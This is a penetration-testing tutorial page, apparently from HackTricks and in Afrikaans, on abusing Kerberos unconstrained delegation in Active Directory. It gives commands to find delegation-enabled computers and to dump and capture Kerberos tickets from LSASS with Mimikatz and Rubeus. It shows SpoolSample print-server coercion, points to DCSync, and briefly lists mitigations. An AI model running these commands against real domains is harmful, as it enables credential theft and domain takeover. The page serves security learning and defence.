# Onbeperkte Delegasie

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Onbeperkte delegasie

Dit is 'n funksie wat 'n Domeinadministrateur kan instel vir enige **Rekenaar** binne die domein. Dan, elke keer as 'n **gebruiker aanmeld** by die Rekenaar, sal 'n **kopie van die TGT** van daardie gebruiker gestuur word binne die TGS wat deur die DC voorsien word **en in die geheue in LSASS gestoor word**. So, as jy Administrateur-voorregte het op die masjien, sal jy in staat wees om die kaartjies te dump en die gebruikers te impersoneer op enige masjien.

Dus, as 'n domein-admin aanmeld op 'n Rekenaar met die "Onbeperkte Delegasie" funksie geaktiveer, en jy het plaaslike admin-voorregte binne daardie masjien, sal jy in staat wees om die kaartjie te dump en die Domein-admin enige plek te impersoneer (domeinprivesc).

Jy kan **Rekenaarvoorwerpe met hierdie eienskap vind** deur te kyk of die [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) eienskap [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) bevat. Jy kan dit doen met 'n LDAP-filter van ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, dit is wat powerview doen:

<pre class="language-bash"><code class="lang-bash"># Lys onbeperkte rekenaars
## Powerview
Get-NetComputer -Unconstrained #DC's verskyn altyd, maar is nie nuttig vir privesc nie
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Voer kaartjies uit met Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Aanbevole manier
kerberos::list /export #Nog 'n manier

# Monitor aanmeldings en voer nuwe kaartjies uit
.\Rubeus.exe monitor /targetuser:&#x3C;gebruikersnaam> /interval:10 #Kyk elke 10s vir nuwe TGT's</code></pre>

Laai die kaartjie van die Administrateur (of slagoffer-gebruiker) in die geheue met **Mimikatz** of **Rubeus vir 'n** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Meer inligting: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Meer inligting oor Onbeperkte delegasie in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Dwing Verifikasie**

As 'n aanvaller in staat is om 'n rekenaar wat toegelaat word vir "Onbeperkte Delegasie" te **kompromitteer**, kan hy 'n **Drukbediener** mislei om outomaties teen dit aan te meld en 'n TGT in die geheue van die bediener te stoor.\
Dan kan die aanvaller 'n **Pass the Ticket-aanval uitvoer om** die gebruiker se Drukbediener-rekenaarrekening te impersoneer.

Om 'n drukbediener teen enige masjien te laat aanmeld, kan jy [**SpoolSample**](https://github.com/leechristensen/SpoolSample) gebruik:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
As die TGT van 'n domeinbeheerder afkomstig is, kan jy 'n [**DCSync-aanval**](acl-persistence-abuse/#dcsync) uitvoer en al die hase van die DC verkry.\
[**Meer inligting oor hierdie aanval by ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Hier is ander maniere om te probeer om 'n outentifikasie af te dwing:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Versagting

* Beperk DA/Admin-aantekeninge tot spesifieke dienste
* Stel "Rekening is sensitief en kan nie gedelegeer word nie" vir bevoorregte rekeninge.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
